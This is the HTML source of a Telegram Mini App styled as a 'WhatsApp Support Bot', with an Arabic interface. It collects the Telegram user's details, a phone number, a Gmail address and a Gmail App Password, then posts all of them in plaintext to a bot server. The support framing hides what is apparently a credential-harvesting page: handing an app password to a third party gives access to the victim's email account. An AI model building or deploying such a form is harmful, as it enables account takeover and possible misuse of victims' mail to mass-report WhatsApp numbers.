<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>WhatsApp Support Bot</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            padding: 20px;
            direction: rtl;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        
        .card {
            background: var(--tg-theme-secondary-bg-color, #f5f5f5);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--tg-theme-hint-color, #666);
        }
        
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--tg-theme-hint-color, #ddd);
            border-radius: 8px;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            font-size: 16px;
            direction: ltr;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: var(--tg-theme-button-color, #0088cc);
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: var(--tg-theme-button-color, #0088cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        button:active {
            opacity: 0.8;
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            display: none;
        }
        
        .status.success {
            background: rgba(76, 175, 80, 0.1);
            color: #4caf50;
            border: 1px solid #4caf50;
            display: block;
        }
        
        .status.error {
            background: rgba(244, 67, 54, 0.1);
            color: #f44336;
            border: 1px solid #f44336;
            display: block;
        }
        
        .status.info {
            background: rgba(33, 150, 243, 0.1);
            color: #2196f3;
            border: 1px solid #2196f3;
            display: block;
        }
        
        .user-info {
            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .user-info p {
            margin: 5px 0;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .badge {
            display: inline-block;
            padding: 4px 12px;
            background: var(--tg-theme-button-color, #0088cc);
            color: white;
            border-radius: 20px;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .card {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📱 دعم واتساب</h1>
            <span class="badge">Mini App</span>
        </div>
        
        <div class="user-info" id="userInfo">
            <p>👤 جاري تحميل بيانات المستخدم...</p>
        </div>
        
        <div class="card">
            <div class="form-group">
                <label>📞 رقم الهاتف (بدون +)</label>
                <input type="tel" id="phoneNumber" placeholder="مثال: 966512345678" dir="ltr">
            </div>
            
            <div class="form-group">
                <label>📧 البريد الإلكتروني (Gmail)</label>
                <input type="email" id="email" placeholder="example@gmail.com" dir="ltr">
            </div>
            
            <div class="form-group">
                <label>🔑 كلمة مرور التطبيق (App Password)</label>
                <input type="password" id="password" placeholder="أدخل كلمة مرور التطبيق" dir="ltr">
            </div>
            
            <button id="sendBtn" onclick="sendReport()">📤 إرسال البلاغ</button>
        </div>
        
        <div id="status" class="status"></div>
    </div>
    
    <script>
        let tg = window.Telegram.WebApp;
        let user = null;
        
        // تهيئة التطبيق
        tg.ready();
        tg.expand(); // توسيع التطبيق لملء الشاشة
        
        // الحصول على بيانات المستخدم
        user = tg.initDataUnsafe?.user;
        
        if (user) {
            document.getElementById('userInfo').innerHTML = `
                <p>👤 ${user.first_name || ''} ${user.last_name || ''}</p>
                <p>🆔 ${user.id}</p>
                <p>📝 ${user.username ? '@' + user.username : 'لا يوجد يوزرنيم'}</p>
            `;
        } else {
            document.getElementById('userInfo').innerHTML = '<p>👤 زائر</p>';
        }
        
        // تعيين لون الزر حسب ثيم التطبيق
        const mainButton = tg.MainButton;
        mainButton.setText("إرسال البلاغ");
        mainButton.onClick(() => sendReport());
        mainButton.show();
        
        async function sendReport() {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const statusDiv = document.getElementById('status');
            
            // التحقق من المدخلات
            if (!phoneNumber) {
                showStatus('الرجاء إدخال رقم الهاتف', 'error');
                return;
            }
            
            if (!email) {
                showStatus('الرجاء إدخال البريد الإلكتروني', 'error');
                return;
            }
            
            if (!password) {
                showStatus('الرجاء إدخال كلمة مرور التطبيق', 'error');
                return;
            }
            
            // التحقق من صيغة البريد
            if (!email.match(/^[a-zA-Z0-9._%+-]+@gmail\.com$/)) {
                showStatus('الرجاء إدخال بريد Gmail صحيح', 'error');
                return;
            }
            
            // التحقق من صيغة الرقم
            if (!phoneNumber.match(/^\d{8,15}$/)) {
                showStatus('الرقم يجب أن يحتوي على 8-15 رقم فقط', 'error');
                return;
            }
            
            // تعطيل الزر
            const btn = document.getElementById('sendBtn');
            btn.disabled = true;
            btn.textContent = 'جاري الإرسال...';
            
            showStatus('جاري إرسال البلاغ...', 'info');
            
            try {
                // إرسال البيانات إلى البوت عبر Webhook
                const response = await fetch(`https://YOUR_BOT_HOST/api/send`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: user?.id || 'unknown',
                        phone_number: phoneNumber,
                        email: email,
                        password: password,
                        username: user?.username || '',
                        first_name: user?.first_name || ''
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showStatus('✅ تم إرسال البلاغ بنجاح! سيتم الرد خلال 24-48 ساعة', 'success');
                    tg.showAlert('تم إرسال البلاغ بنجاح!');
                    
                    // مسح الحقول
                    document.getElementById('phoneNumber').value = '';
                    document.getElementById('email').value = '';
                    document.getElementById('password').value = '';
                    
                    // إغلاق التطبيق بعد 3 ثواني
                    setTimeout(() => {
                        tg.close();
                    }, 3000);
                } else {
                    showStatus(`❌ فشل الإرسال: ${result.message}`, 'error');
                    tg.showAlert(`فشل الإرسال: ${result.message}`);
                }
            } catch (error) {
                console.error('Error:', error);
                showStatus('❌ حدث خطأ في الاتصال. الرجاء المحاولة مرة أخرى', 'error');
                tg.showAlert('حدث خطأ في الاتصال');
            } finally {
                btn.disabled = false;
                btn.textContent = '📤 إرسال البلاغ';
            }
        }
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            
            if (type !== 'error') {
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 5000);
            }
        }
        
        // تحسين التطبيق للهواتف
        tg.setBackgroundColor('var(--tg-theme-bg-color)');
        tg.setHeaderColor('var(--tg-theme-header-bg-color)');
    </script>
</body>
</html>
